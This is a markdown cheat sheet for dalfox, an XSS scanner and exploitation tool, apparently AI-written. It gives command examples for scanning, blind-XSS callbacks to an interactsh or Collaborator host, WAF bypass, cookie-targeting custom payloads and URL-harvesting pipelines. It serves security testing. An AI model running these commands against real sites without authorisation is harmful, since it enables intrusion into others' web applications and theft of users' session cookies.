# dalfox

**Tags:** `#dalfox` `#xss` `#webappsec` `#scanning` `#web`

Fast Go-based XSS scanner and exploitation tool. Finds reflected, DOM, and stored XSS vulnerabilities. Supports blind XSS callbacks, WAF bypass techniques, custom payloads, and pipeline integration with tools like gau, waybackurls, and katana.

**Source:** https://github.com/hahwul/dalfox
**Install:** `go install github.com/hahwul/dalfox/v2@latest` or `sudo apt install dalfox`

```bash
dalfox url "http://target.com/search?q=test"
```

> [!note]
> dalfox uses parameter analysis and DOM parsing to minimize false positives. Use `--blind` with a callback URL (interactsh, Burp Collaborator) for blind XSS in stored/delayed contexts. The `pipe` mode integrates well with URL discovery tools.

---

## Basic Scanning

```bash
# Single URL
dalfox url "http://target.com/search?q=test"

# Target specific parameter
dalfox url "http://target.com/search?q=test" -p q

# POST request
dalfox url "http://target.com/search" --data "q=test&page=1"

# Multiple URLs from file
dalfox file urls.txt

# Pipe mode
cat urls.txt | dalfox pipe
echo "http://target.com/search?q=test" | dalfox pipe
```

---

## Authentication & Headers

```bash
# Cookie
dalfox url "http://target.com/search?q=test" --cookie "session=abc123"

# Custom headers
dalfox url "http://target.com/search?q=test" \
  --header "Authorization: Bearer token"

# Follow redirects
dalfox url "http://target.com/search?q=test" --follow-redirects
```

---

## Blind XSS

```bash
# Use Burp Collaborator or interactsh callback URL
dalfox url "http://target.com/search?q=test" \
  --blind "https://your.callback.url/xss"

# interactsh (recommended)
interactsh-client    # generates URL like abc123.interact.sh
dalfox url "http://target.com/search?q=test" \
  --blind "https://abc123.interact.sh"
```

---

## WAF Bypass & Evasion

```bash
# Built-in WAF bypass mode
dalfox url "http://target.com/search?q=test" --waf-bypass

# Encoding
dalfox url "http://target.com/search?q=test" --encoding html
dalfox url "http://target.com/search?q=test" --encoding url

# Rate limiting
dalfox url "http://target.com/search?q=test" --delay 500

# Through proxy
dalfox url "http://target.com/search?q=test" --proxy http://127.0.0.1:8080
```

---

## Custom Payloads

```bash
# Custom payload file
dalfox url "http://target.com/search?q=test" --custom-payload payloads.txt

# Custom alert value (what executes in alert())
dalfox url "http://target.com/search?q=test" --custom-alert-value "document.cookie"

# Skip built-in payloads, use only custom
dalfox url "http://target.com/search?q=test" \
  --only-custom-payload --custom-payload payloads.txt
```

---

## Output

```bash
# Output to file
dalfox url "http://target.com/search?q=test" -o results.txt

# JSON output
dalfox url "http://target.com/search?q=test" --format json -o results.json

# Silent — only show confirmed XSS
dalfox url "http://target.com/search?q=test" --silence
```

---

## Pipeline Integration

```bash
# From gau (get all URLs — historical)
gau target.com | dalfox pipe --silence

# From waybackurls
waybackurls target.com | grep "=" | dalfox pipe

# From katana (active crawler)
katana -u http://target.com | dalfox pipe

# Pre-filter to only URLs with params
gau target.com | grep "=" | uro | dalfox pipe
```

---

## Key Flags

| Flag | Description |
|------|-------------|
| `-p` | Specific parameter to test |
| `--data` | POST body |
| `--cookie` | Cookie string |
| `--header` | Custom header (repeatable) |
| `--blind` | Blind XSS callback URL |
| `--waf-bypass` | WAF bypass techniques |
| `--delay` | Delay between requests (ms) |
| `--worker` | Concurrent workers (default 100) |
| `--custom-payload` | Custom payload file |
| `--only-custom-payload` | Skip built-in payloads |
| `--format` | Output format: plain/json |
| `-o` | Output file |
| `--silence` | Only print confirmed findings |
| `--follow-redirects` | Follow HTTP redirects |
| `--proxy` | HTTP proxy |

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
